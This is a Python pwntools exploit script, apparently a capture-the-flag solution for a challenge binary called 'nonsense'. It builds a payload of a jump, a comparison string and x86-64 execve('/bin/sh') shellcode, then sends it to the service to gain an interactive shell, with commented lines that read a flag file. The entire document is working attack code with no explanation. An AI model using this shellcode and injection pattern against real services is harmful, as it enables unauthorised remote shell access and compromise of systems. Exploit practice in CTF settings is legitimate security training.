from pwn import *

_local = False

host = 'localhost'
port = 10001

exe_path = './nonsense'
context(arch='amd64', os='linux')
elf = ELF(exe_path)

compare = b'wubbalubbadubdub' * 2
jmp_distance = b'\x77\x20'  #b'\xeb\x10' -> not ascii printable
binsh = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

name = 'asdf'
payload = jmp_distance + compare + binsh
with open('bin', 'wb') as f:
    f.write(payload)

def exploit(s):
    s.recvuntil("?\n")
    s.sendline(name)
    s.recvuntil('?\n')
    s.sendline(payload)
    # s.recv(timeout = 1)
    # s.sendline('cat /home/nonsense/flag')
    # print (s.recvline()[:-1].decode())
    s.interactive()

if __name__ == "__main__":
    if _local:
        s = process(exe_path)
    else:
        s = remote(host, port)
    exploit(s)
    s.close()